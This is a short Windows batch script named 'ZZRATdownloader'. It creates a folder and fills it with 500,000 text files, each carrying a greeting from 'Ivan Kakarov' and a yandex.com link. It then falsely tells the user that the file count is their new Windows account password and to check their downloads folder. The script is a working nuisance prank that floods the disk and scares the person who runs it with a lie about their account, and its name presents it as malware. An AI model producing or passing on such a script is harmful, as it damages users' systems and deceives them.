::ZZRATdownloader
@echo off
REM Set the number of text files to create
set count=500000
Set phlink=https://www.yandex.com

REM Create a folder named "ZZFILES"
mkdir "ZZFILES" 2>nul

REM Loop to create the specified number of files
for /l %%i in (1,1,%count%) do (
    echo HI FROM IVAN KAKAROV  %phlink% > "ZZFILES\HI_FROM_IVAN_KAKAROV_%%i.txt"
)

REM Notify the user
echo Folder "ZZFILES" created with %count% . Remember this key: %count% it is your new windows account password.
echo check your downloads folder
pause
